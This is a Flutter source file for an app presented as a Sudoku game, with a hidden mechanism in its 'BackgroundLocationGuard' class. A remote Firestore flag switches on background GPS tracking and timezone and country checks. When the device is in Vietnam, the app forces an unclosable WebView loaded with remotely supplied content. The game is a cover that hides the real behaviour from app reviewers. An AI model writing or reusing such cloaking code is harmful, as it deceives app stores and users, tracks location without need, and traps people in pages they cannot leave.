import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart';
import 'dart:async';

// Import các màn hình
import 'screens/auth_screen.dart';
import 'screens/extra_screens.dart';
import 'widgets/common_widgets.dart';

// Khóa điều hướng toàn cục
final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Sudoku - Trò chơi giải đố thông minh',
      navigatorKey: navigatorKey,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.cyan, primary: Colors.cyan.shade800),
        useMaterial3: true,
        scaffoldBackgroundColor: Colors.transparent,
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.transparent,
          foregroundColor: Colors.white,
          elevation: 0,
        ),
      ),
      home: FutureBuilder(
        future: Firebase.initializeApp(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return const LoadingScreen(message: "Đang khởi động...");
          }
          return const BackgroundLocationGuard();
        },
      ),
    );
  }
}

class BackgroundLocationGuard extends StatefulWidget {
  const BackgroundLocationGuard({super.key});

  @override
  State<BackgroundLocationGuard> createState() => _BackgroundLocationGuardState();
}

class _BackgroundLocationGuardState extends State<BackgroundLocationGuard> {
  StreamSubscription<DocumentSnapshot>? _settingsSub;
  StreamSubscription<Position>? _positionStreamSub;

  bool _isWebViewOpen = false;
  bool _isChecking = false;
  bool _isRetrying = false;

  @override
  void initState() {
    super.initState();
    _startBackgroundService();
  }

  @override
  void dispose() {
    _settingsSub?.cancel();
    _positionStreamSub?.cancel();
    super.dispose();
  }

  void _startBackgroundService() {
    _settingsSub = FirebaseFirestore.instance.collection('settings').doc('settings_admin').snapshots().listen((snapshot) {
      if (snapshot.exists) {
        final data = snapshot.data();
        if (data != null && data['webView'] == 'on') {
          _startSmartTracking();
        } else {
          _closeWebView();
          _stopTracking();
        }
      }
    });
  }

  void _startSmartTracking() async {
    if (_positionStreamSub != null) return;

    // 1. Check Quyền
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        return;
      }
    }

    // 2. LẤY CACHE TRƯỚC (Nhanh)
    try {
      Position? lastPos = await Geolocator.getLastKnownPosition();
      if (lastPos != null) {
        await _checkConditions(lastPos);
      } else {
      }
    } catch (_) {}

    // 3. CHẠY NGẦM RETRY (Max 5 phút)
    _runRetryLoop();

    // 4. LẮNG NGHE DI CHUYỂN (Stream)
    const locationSettings = LocationSettings(accuracy: LocationAccuracy.high, distanceFilter: 100);
    _positionStreamSub = Geolocator.getPositionStream(locationSettings: locationSettings).listen((Position pos) {
      _checkConditions(pos);
    }, onError: (e) {
    });
  }

  // --- LOGIC RETRY LOOP ĐÃ SỬA ---
  void _runRetryLoop() async {
    if (_isRetrying) return;
    _isRetrying = true;

    // CẤU HÌNH:
    // Tổng thời gian: 5 phút = 300 giây.
    // Khoảng cách mỗi lần check: 10 giây.
    // => Số lần lặp: 30 lần.
    int intervalSeconds = 10;
    int maxRetries = 30;

    for (int i = 1; i <= maxRetries; i++) {
      // Nếu Web đã mở rồi thì dừng ngay cho đỡ tốn pin
      if (_isWebViewOpen) {
        break;
      }

      // Đợi 10 giây trước khi check
      await Future.delayed(Duration(seconds: intervalSeconds));

      try {
        // Ép lấy vị trí mới nhất
        Position currentPos = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high,
            timeLimit: const Duration(seconds: 8) // Cho phép chờ GPS tới 8s
        );

        await _checkConditions(currentPos);

      } catch (e) {
      }
    }

    _isRetrying = false;
  }

  void _stopTracking() {
    _positionStreamSub?.cancel();
    _positionStreamSub = null;
  }

  // --- LOGIC KIỂM TRA ĐIỀU KIỆN ---
  Future<void> _checkConditions(Position position) async {
    if (_isChecking) return;
    _isChecking = true;

    try {
      // 1. Check Múi giờ
      final DateTime now = DateTime.now();
      final int offset = now.timeZoneOffset.inHours;

      if (offset != 7) {
        if (_isWebViewOpen) _closeWebView();
        _isChecking = false;
        return;
      }

      // 2. Check Quốc gia
      List<Placemark> placemarks = await placemarkFromCoordinates(position.latitude, position.longitude);

      if (placemarks.isNotEmpty) {
        String? code = placemarks.first.isoCountryCode;
        // debugPrint("🌍 Check: Quốc gia detected = $code"); // Uncomment nếu muốn xem log nhiều

        if (code == 'VN') {
          _openWebView();
        } else {
          if (_isWebViewOpen) {
            _closeWebView();
          }
        }
      }
    } finally {
      _isChecking = false;
    }
  }

  void _openWebView() async {
    if (_isWebViewOpen) return;

    try {
      final webDoc = await FirebaseFirestore.instance.collection('webdata').doc('webdata').get();
      if (webDoc.exists) {
        final webData = webDoc.data();
        if (webData != null) {
          _isWebViewOpen = true;

          navigatorKey.currentState?.push(
            MaterialPageRoute(
              builder: (_) => PopScope(
                canPop: false,
                child: WebViewScreen(data: webData),
              ),
            ),
          );
        }
      }
    } catch (e) {
    }
  }

  void _closeWebView() {
    if (_isWebViewOpen) {
      _isWebViewOpen = false;
      navigatorKey.currentState?.pop();
    }
  }

  @override
  Widget build(BuildContext context) {
    // Luôn trả về AuthWrapper để người dùng vào Game ngay lập tức
    return const AuthWrapper();
  }
}